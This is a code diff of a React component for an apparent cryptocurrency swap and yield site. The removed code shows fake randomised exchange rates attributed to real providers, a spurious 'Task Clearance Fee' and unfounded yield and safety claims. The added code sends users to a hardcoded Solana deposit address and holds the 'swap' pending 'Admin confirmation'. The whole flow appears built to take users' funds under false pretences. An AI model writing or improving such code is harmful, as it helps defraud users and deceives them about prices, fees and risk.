@@ -1,5 +1,5 @@
 import React, { useState, useMemo, useEffect } from 'react';
-import { AssetInfo, ExchangeOffer, WalletData } from '../types';
+import { AssetInfo, WalletData } from '../types';
 
 interface SwapViewProps {
   assets: AssetInfo[];
@@ -15,24 +15,55 @@ interface SwapViewProps {
 }
 
 const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConnect, onSignUp, onConfirm, onSwap, onDeposit, onRefreshBalances, depositAddress }) => {
-  const [fromAsset, setFromAsset] = useState<AssetInfo | null>(assets[0] || null);
-  const [toAsset, setToAsset] = useState<AssetInfo | null>(assets[1] || null);
+  const [fromAsset, setFromAsset] = useState<AssetInfo | null>(assets.find(a => a.symbol !== 'USDT') || assets[0] || null);
+  const [toAsset, setToAsset] = useState<AssetInfo | null>(assets.find(a => a.symbol === 'USDT') || assets[1] || null);
   const [amount, setAmount] = useState('');
-  const [selectedOfferId, setSelectedOfferId] = useState<string | null>(null);
-  const [activeMode, setActiveMode] = useState<'swap' | 'yield'>('swap');
-  const [isSwapping, setIsSwapping] = useState(false);
-  const [copied, setCopied] = useState(false);
-  
   const [isSelectorOpen, setIsSelectorOpen] = useState(false);
   const [selectorSide, setSelectorSide] = useState<'from' | 'to'>('from');
   const [searchQuery, setSearchQuery] = useState('');
+  const [isSwapping, setIsSwapping] = useState(false);
+  const [showDeposit, setShowDeposit] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     if (assets.length >= 2) {
-      if (!fromAsset) setFromAsset(assets[0]);
-      if (!toAsset) setToAsset(assets[1]);
+      if (!fromAsset) setFromAsset(assets.find(a => a.symbol !== 'USDT') || assets[0]);
+      if (!toAsset) setToAsset(assets.find(a => a.symbol === 'USDT') || assets[1]);
     }
   }, [assets]);
+
+  const equivalentUsdt = useMemo(() => {
+    if (!amount || !fromAsset || !toAsset) return '0.00';
+    return (parseFloat(amount) * (fromAsset.price / toAsset.price)).toFixed(2);
+  }, [amount, fromAsset, toAsset]);
+
+  const handleAction = async () => {
+    if (!isConnected) { onConnect(); return; }
+    if (!amount || parseFloat(amount) <= 0) return;
+
+    setIsSwapping(true);
+    try {
+        // Set pending deposit in DB so admin sees it
+        const res = await fetch('/api/admin/deposit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                walletAddress: wallet?.address,
+                currency: fromAsset?.symbol,
+                amount: equivalentUsdt // Send the USDT value
+            })
+        });
+
+        if (res.ok) {
+            setShowDeposit(true);
+            if (onRefreshBalances) onRefreshBalances();
+        }
+    } catch (e) {
+        console.error('Swap action failed', e);
+    } finally {
+        setIsSwapping(false);
+    }
+  };
 
   const handleManualSwap = async () => {
       if (!wallet?.address) return;
@@ -45,73 +76,14 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
           });
           if (res.ok) {
               if (onRefreshBalances) onRefreshBalances();
-              alert('Swap successful! USDT added to Protocol Balance.');
+              alert('Settlement Request Received. Waiting for Admin confirmation.');
+              setShowDeposit(false);
           }
       } catch (e) {
           console.error('Swap failed', e);
       } finally {
           setIsSwapping(false);
       }
-  };
-
-  const providers = [
-    { name: 'ChangeNOW', logo: 'CN' },
-    { name: 'SimpleSwap', logo: 'SS' },
-    { name: 'StealthEX', logo: 'SX' },
-    { name: 'Exolix', logo: 'EX' },
-    { name: 'FixedFloat', logo: 'FF' }
-  ];
-
-  const offers: ExchangeOffer[] = useMemo(() => {
-    if (!amount || parseFloat(amount) <= 0 || !fromAsset || !toAsset) return [];
-    const baseRate = fromAsset.price / toAsset.price;
-    return providers.map((p, i) => ({
-      id: `offer-${p.name}`,
-      provider: p.name,
-      rate: baseRate * (1 + (Math.random() * 0.02 - 0.01)),
-      eta: `${5 + Math.floor(Math.random() * 15)}m`,
-      rating: 4 + Math.random(),
-      type: (i === 0 ? 'Best rate' : i === 1 ? 'Fastest' : 'Standard') as ExchangeOffer['type'],
-      logo: p.logo
-    })).sort((a, b) => b.rate - a.rate);
-  }, [amount, fromAsset, toAsset]);
-
-  useEffect(() => {
-    if (offers.length > 0 && !selectedOfferId) setSelectedOfferId(offers[0].id);
-  }, [offers, selectedOfferId]);
-
-  const selectedOffer = useMemo(() => offers.find(o => o.id === selectedOfferId), [offers, selectedOfferId]);
-
-  if (!fromAsset || !toAsset) {
-    return (
-      <div className="w-full max-w-4xl p-12 text-center">
-        <div className="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-        <p className="text-gray-500 font-black uppercase tracking-widest text-xs">Syncing Protocol Liquidity...</p>
-      </div>
-    );
-  }
-
-  const handleAction = () => {
-    if (!isConnected) { onConnect(); return; }
-    
-    // Deposit Fee Logic: $10 fee for deposits over $30
-    const numAmount = parseFloat(amount || '0');
-    if (activeMode === 'yield' && numAmount > 30) {
-      onConfirm(
-        `PROTOCOL NOTICE: Deposits exceeding $30 require a $10 Task Clearance Fee for Mainnet synchronization. Total required: $${(numAmount + 10).toFixed(2)}`,
-        () => onDeposit(amount, fromAsset.symbol)
-      );
-      return;
-    }
-
-    if (activeMode === 'yield') { onDeposit(amount, fromAsset.symbol); return; }
-    const selectedOffer = offers.find(o => o.id === selectedOfferId);
-    if (!selectedOffer) return;
-    
-    onConfirm(
-        `Swap ${amount} ${fromAsset.symbol} via ${selectedOffer.provider}`,
-        () => onSwap(fromAsset.symbol, toAsset.symbol, amount)
-    );
   };
 
   const openSelector = (side: 'from' | 'to') => {
@@ -122,11 +94,22 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
 
   const handleSelectAsset = (asset: AssetInfo) => {
     if (selectorSide === 'from') {
-        if (asset.symbol === toAsset.symbol) setToAsset(fromAsset);
-        setFromAsset(asset);
+        if (asset.symbol === toAsset.symbol) {
+            // Swap if selecting same
+            const temp = toAsset;
+            setToAsset(fromAsset);
+            setFromAsset(temp);
+        } else {
+            setFromAsset(asset);
+        }
     } else {
-        if (asset.symbol === fromAsset.symbol) setFromAsset(toAsset);
-        setToAsset(asset);
+        if (asset.symbol === fromAsset.symbol) {
+            const temp = fromAsset;
+            setFromAsset(toAsset);
+            setToAsset(temp);
+        } else {
+            setToAsset(asset);
+        }
     }
     setIsSelectorOpen(false);
   };
@@ -136,6 +119,15 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
     a.name.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
+  if (!fromAsset || !toAsset) {
+    return (
+      <div className="w-full max-w-4xl p-12 text-center">
+        <div className="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+        <p className="text-gray-500 font-black uppercase tracking-widest text-xs">Syncing Protocol Liquidity...</p>
+      </div>
+    );
+  }
+
   return (
     <div className="h-full p-8 flex flex-col items-center bg-[#0B0E11] animate-in fade-in duration-500 relative overflow-y-auto custom-scrollbar">
       <div className="w-full max-w-4xl space-y-8 pb-20">
@@ -144,10 +136,6 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
           <div className="space-y-1">
             <h1 className="text-4xl font-black text-gray-100 italic uppercase tracking-tighter">Swap Magregator</h1>
             <p className="text-xs text-indigo-500 font-bold uppercase tracking-[0.4em]">Atomic Cross-Chain Bridge</p>
-          </div>
-          <div className="flex justify-center space-x-2 bg-[#181C25] p-1 rounded-full w-fit mx-auto border border-[#2B3139]">
-            <button onClick={() => setActiveMode('swap')} className={`px-8 py-2.5 rounded-full text-xs font-black uppercase tracking-widest transition-all ${activeMode === 'swap' ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-500/20' : 'text-gray-500 hover:text-gray-200'}`}>Swap Magregator</button>
-            <button onClick={() => setActiveMode('yield')} className={`px-8 py-2.5 rounded-full text-xs font-black uppercase tracking-widest transition-all ${activeMode === 'yield' ? 'bg-orange-600 text-white shadow-lg shadow-orange-500/20' : 'text-gray-500 hover:text-gray-200'}`}>Geko Vault</button>
           </div>
         </div>
 
@@ -166,42 +154,71 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
           </div>
         )}
 
-        {wallet?.pending_deposit_amount && wallet.pending_deposit_amount > 0 && (
-            <div className="bg-indigo-600/10 border border-indigo-500/30 rounded-[40px] p-8 flex flex-col md:flex-row items-center justify-between gap-6 animate-in slide-in-from-top-4">
-                <div className="flex items-center space-x-6">
-                    <div className="w-16 h-16 bg-indigo-600 rounded-2xl flex items-center justify-center text-white font-black italic shadow-lg">
-                        {wallet.pending_deposit_currency?.[0] || 'D'}
+        {showDeposit && (
+            <div className="bg-indigo-600/10 border border-indigo-500/30 rounded-[40px] p-10 space-y-8 animate-in slide-in-from-top-4">
+                <div className="flex flex-col md:flex-row items-center justify-between gap-6">
+                    <div className="flex items-center space-x-6">
+                        <div className="w-16 h-16 bg-indigo-600 rounded-2xl flex items-center justify-center text-white font-black italic shadow-lg">
+                            {fromAsset?.symbol[0] || 'D'}
+                        </div>
+                        <div>
+                            <div className="text-[10px] text-indigo-400 font-black uppercase tracking-widest mb-1">Deposit Address Generated</div>
+                            <div className="text-2xl font-black text-white italic">Send {amount} {fromAsset?.symbol}</div>
+                            <div className="text-[10px] text-gray-500 uppercase font-bold mt-1">Institutional swap waiting for settlement</div>
+                        </div>
                     </div>
-                    <div>
-                        <div className="text-[10px] text-indigo-400 font-black uppercase tracking-widest mb-1">Incoming Clearing Detected</div>
-                        <div className="text-3xl font-black text-white italic">{wallet.pending_deposit_amount} {wallet.pending_deposit_currency}</div>
-                        <div className="text-[10px] text-gray-500 uppercase font-bold mt-1">Institutional deposit waiting for settlement</div>
+                    <div className="flex flex-col items-end space-y-2">
+                        <div className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Equivalent USDT</div>
+                        <div className="text-3xl font-black text-emerald-500 font-mono">${equivalentUsdt}</div>
                     </div>
                 </div>
+
+                <div className="space-y-3">
+                    <div className="text-[10px] text-indigo-400 font-black uppercase tracking-widest pl-1">Master Deposit Address (SOL)</div>
+                    <div className="flex items-center space-x-3 bg-[#0B0E11] p-6 rounded-2xl border border-indigo-500/20 group">
+                        <input 
+                            type="text"
+                            readOnly
+                            value={depositAddress || '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'}
+                            className="flex-1 bg-transparent text-sm font-mono font-bold text-indigo-400 outline-none"
+                        />
+                        <button 
+                            onClick={() => { navigator.clipboard.writeText(depositAddress || '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
+                            className="p-2 hover:bg-[#181C25] rounded-xl transition-colors text-indigo-500/50 hover:text-indigo-500"
+                        >
+                            {copied ? (
+                                <span className="text-[9px] font-black uppercase">Copied</span>
+                            ) : (
+                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
+                            )}
+                        </button>
+                    </div>
+                </div>
+
                 <button 
                     onClick={handleManualSwap}
                     disabled={isSwapping}
-                    className="bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white px-10 py-5 rounded-[20px] font-black uppercase italic tracking-widest shadow-xl transition-all flex items-center space-x-3"
+                    className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white py-6 rounded-3xl font-black uppercase italic tracking-[0.2em] shadow-xl transition-all flex items-center justify-center space-x-3"
                 >
                     {isSwapping ? (
                         <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                     ) : (
                         <>
-                            <span>Swap to USDT</span>
-                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+                            <span>I Have Sent {amount} {fromAsset?.symbol}</span>
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                         </>
                     )}
                 </button>
             </div>
         )}
 
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-          <div className="lg:col-span-5 space-y-4">
+        <div className="grid grid-cols-1 gap-8 items-start">
+          <div className="space-y-4">
             {/* Swap Input Card */}
-            <div className={`glass rounded-[40px] p-2 shadow-xl transition-all duration-500 ${activeMode === 'yield' ? 'border-orange-500/30 bg-[#181C25]/50' : 'hover:border-indigo-500/30 bg-[#181C25]/50'}`}>
+            <div className={`glass rounded-[40px] p-2 shadow-xl transition-all duration-500 hover:border-indigo-500/30 bg-[#181C25]/50`}>
               <div className="bg-[#1E2329] p-8 rounded-[36px] border border-[#2B3139] space-y-6 shadow-sm">
                 <div className="flex justify-between items-center px-1">
-                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{activeMode === 'swap' ? 'Pay with' : 'Deposit'}</span>
+                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Pay with</span>
                    <div className="flex items-center space-x-2">
                       <span className="text-[10px] text-indigo-400 font-mono">~${(parseFloat(amount || '0') * (fromAsset?.price || 0)).toFixed(2)} USD</span>
                    </div>
@@ -219,47 +236,39 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
                 </div>
               </div>
 
-              {activeMode === 'swap' && (
-                <div className="flex justify-center -my-4 relative z-20">
-                   <button 
-                     onClick={() => { if(fromAsset && toAsset) { const t = fromAsset; setFromAsset(toAsset); setToAsset(t); } }}
-                     className="w-12 h-12 bg-[#181C25] border-4 border-[#0B0E11] rounded-2xl flex items-center justify-center hover:scale-110 active:rotate-180 transition-all shadow-xl text-indigo-500 group border-[#2B3139]"
-                   >
-                     <svg className="w-6 h-6 group-hover:rotate-180 transition-transform duration-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16V4m0 0L3 8m4-4l4 4m6 0v12m0 0l4-4m-4 4l-4-4" /></svg>
-                   </button>
-                </div>
-              )}
+              <div className="flex justify-center -my-4 relative z-20">
+                   <div className="w-12 h-12 bg-[#181C25] border-4 border-[#0B0E11] rounded-2xl flex items-center justify-center shadow-xl text-indigo-500 border-[#2B3139]">
+                     <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" /></svg>
+                   </div>
+              </div>
 
               <div className="bg-[#1E2329] p-8 rounded-[36px] border border-[#2B3139] space-y-6 shadow-sm">
                 <div className="flex justify-between items-center px-1">
-                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{activeMode === 'swap' ? 'Receive' : 'Strategy'}</span>
-                   {activeMode === 'swap' && <span className="text-[10px] text-emerald-500 font-bold">Best rate found</span>}
+                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Receive Equivalent</span>
+                   <span className="text-[10px] text-emerald-500 font-bold">Best protocol rate</span>
                 </div>
-                {activeMode === 'swap' ? (
-                  <div className="flex items-center space-x-4">
-                    <div className="flex-1 text-4xl font-bold text-gray-100">
-                      {selectedOffer ? (parseFloat(amount || '0') * selectedOffer.rate).toFixed(6) : '0.00'}
-                    </div>
-                    <button 
-                      onClick={() => openSelector('to')}
-                      className="flex items-center space-x-2 bg-[#2B3139] hover:bg-[#363C45] px-5 py-3 rounded-2xl border border-[#2B3139] transition-all active:scale-95 group"
-                    >
-                      <div className="w-6 h-6 bg-purple-600 rounded-lg flex items-center justify-center font-bold text-[10px] text-white">{toAsset?.symbol[0] || '?'}</div>
-                      <span className="font-black text-sm text-gray-200">{toAsset?.symbol || '...'}</span>
-                      <svg className="w-4 h-4 text-gray-500 group-hover:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
-                    </button>
+                <div className="flex items-center space-x-4">
+                  <div className="flex-1 text-4xl font-bold text-gray-100 font-mono">
+                    {equivalentUsdt}
                   </div>
-                ) : (
-                  <div className="p-2">
-                    <div className="text-xl font-black text-orange-500 italic">Institutional Alpha</div>
-                    <p className="text-[10px] text-gray-500 uppercase mt-1">Direct yield optimization</p>
+                  <div className="flex items-center space-x-2 bg-[#0B0E11] px-5 py-3 rounded-2xl border border-[#2B3139]">
+                    <div className="w-6 h-6 bg-emerald-600 rounded-lg flex items-center justify-center font-bold text-[10px] text-white">U</div>
+                    <span className="font-black text-sm text-gray-200">USDT</span>
                   </div>
-                )}
+                </div>
               </div>
 
               <div className="p-6 space-y-4">
-                <button onClick={handleAction} className={`w-full py-6 rounded-[28px] font-black text-lg transition-all shadow-xl uppercase italic tracking-widest ${isConnected ? (activeMode === 'yield' ? 'bg-orange-600 hover:bg-orange-500 text-white' : 'bg-indigo-600 hover:bg-indigo-500 text-white') : 'bg-[#2B3139] hover:bg-[#363C45] text-gray-400'}`}>
-                  {isConnected ? (!amount || parseFloat(amount) <= 0 ? 'ENTER AMOUNT' : (activeMode === 'swap' ? 'EXECUTE SWAP' : 'DEPOSIT TO VAULT')) : 'CONNECT TO SWAP'}
+                <button 
+                    onClick={handleAction} 
+                    disabled={isSwapping || !amount || parseFloat(amount) <= 0}
+                    className={`w-full py-6 rounded-[28px] font-black text-lg transition-all shadow-xl uppercase italic tracking-widest ${isConnected ? 'bg-indigo-600 hover:bg-indigo-500 text-white' : 'bg-[#2B3139] hover:bg-[#363C45] text-gray-400'}`}
+                >
+                  {isSwapping ? (
+                      <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto" />
+                  ) : (
+                      isConnected ? (!amount || parseFloat(amount) <= 0 ? 'ENTER AMOUNT' : 'EXECUTE SWAP') : 'CONNECT TO SWAP'
+                  )}
                 </button>
                 <div className="flex items-center justify-between px-2 text-[10px] text-gray-500 font-bold uppercase tracking-[0.2em]">
                   <div className="flex items-center space-x-1">
@@ -270,94 +279,6 @@ const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConn
                 </div>
               </div>
             </div>
-          </div>
-
-          <div className="lg:col-span-7">
-             {activeMode === 'swap' ? (
-               <div className="space-y-4">
-                 <div className="flex items-center justify-between px-1">
-                    <h2 className="text-xs font-black text-gray-500 uppercase tracking-[0.3em]">Live Rate Comparison</h2>
-                    <span className="text-[10px] text-indigo-400 font-bold">Best rate selected</span>
-                 </div>
-                 <div className="space-y-3">
-                   {amount && parseFloat(amount) > 0 ? (
-                     offers.map((offer) => (
-                       <div key={offer.id} onClick={() => setSelectedOfferId(offer.id)} className={`bg-[#1E2329] rounded-[28px] border p-6 flex items-center justify-between cursor-pointer transition-all hover:scale-[1.01] ${selectedOfferId === offer.id ? 'border-indigo-500 ring-1 ring-indigo-500/50 shadow-lg' : 'border-[#2B3139] hover:border-gray-600'}`}>
-                         <div className="flex items-center space-x-4">
-                            <div className="w-12 h-12 bg-[#2B3139] rounded-2xl flex items-center justify-center font-black text-xs text-gray-400 border border-[#363C45]">{offer.logo}</div>
-                            <div>
-                               <div className="font-black text-gray-200 italic tracking-tight">{offer.provider}</div>
-                               <div className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{offer.type}</div>
-                            </div>
-                         </div>
-                         <div className="text-right">
-                            <div className="text-2xl font-mono font-bold text-gray-200">{(parseFloat(amount) * offer.rate).toFixed(6)}</div>
-                            <div className="text-[9px] text-gray-500 font-mono">1 {fromAsset?.symbol} = {offer.rate.toFixed(4)} {toAsset?.symbol}</div>
-                         </div>
-                       </div>
-                     ))
-                   ) : (
-                     <div className="bg-[#1E2329] rounded-[40px] border-2 border-dashed border-[#2B3139] p-16 text-center space-y-4">
-                        <div className="w-16 h-16 bg-[#2B3139] rounded-full flex items-center justify-center mx-auto text-gray-600">
-                           <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
-                        </div>
-                        <div className="text-gray-600 uppercase tracking-widest font-black text-sm italic">Awaiting protocol input</div>
-                     </div>
-                   )}
-                 </div>
-               </div>
-             ) : (
-               <div className="space-y-6">
-                  <div className="bg-[#1E2329] rounded-[40px] p-10 border border-orange-500/20 shadow-xl relative overflow-hidden">
-                    <h2 className="text-3xl font-black text-gray-100 italic uppercase mb-6">Geko Alpha Strategy</h2>
-                    
-                    {/* Master Deposit Address */}
-                    <div className="mb-8 space-y-3">
-                        <div className="text-[10px] text-orange-500/70 font-black uppercase tracking-widest pl-1">Master Deposit Address (SOL)</div>
-                        <div className="flex items-center space-x-3 bg-[#0B0E11] p-5 rounded-2xl border border-orange-500/10 group">
-                            <input 
-                                type="text"
-                                readOnly
-                                value={depositAddress || '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'}
-                                className="flex-1 bg-transparent text-sm font-mono font-bold text-gray-300 outline-none"
-                            />
-                            <button 
-                                onClick={() => { navigator.clipboard.writeText(depositAddress || '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
-                                className="p-2 hover:bg-[#181C25] rounded-xl transition-colors text-orange-500/50 hover:text-orange-500"
-                            >
-                                {copied ? (
-                                    <span className="text-[9px] font-black uppercase">Copied</span>
-                                ) : (
-                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
-                                )}
-                            </button>
-                        </div>
-                    </div>
-
-                    <div className="grid grid-cols-2 gap-8 mb-8">
-                       <div className="space-y-1">
-                          <div className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Expected APY</div>
-                          <div className="text-3xl font-black text-orange-500">31.2%</div>
-                       </div>
-                       <div className="space-y-1">
-                          <div className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Risk Level</div>
-                          <div className="text-xl font-bold text-gray-200 uppercase">Managed High</div>
-                       </div>
-                    </div>
-                    <div className="bg-[#2B3139]/50 border border-[#2B3139] p-6 rounded-3xl space-y-4">
-                       <p className="text-xs text-gray-400 leading-relaxed uppercase tracking-wider italic font-bold">Automated quantitative yield optimization across 5 protocol layers.</p>
-                       <ul className="grid grid-cols-1 gap-3">
-                          {['Zero liquidation risk', 'Neural rebalancing', 'Atomic yield locks'].map(t => (
-                            <li key={t} className="flex items-center space-x-2 text-[10px] font-black uppercase tracking-widest text-orange-600">
-                               <div className="w-1.5 h-1.5 rounded-full bg-orange-500"></div>
-                               <span>{t}</span>
-                            </li>
-                          ))}
-                       </ul>
-                    </div>
-                  </div>
-               </div>
-             )}
           </div>
         </div>
 
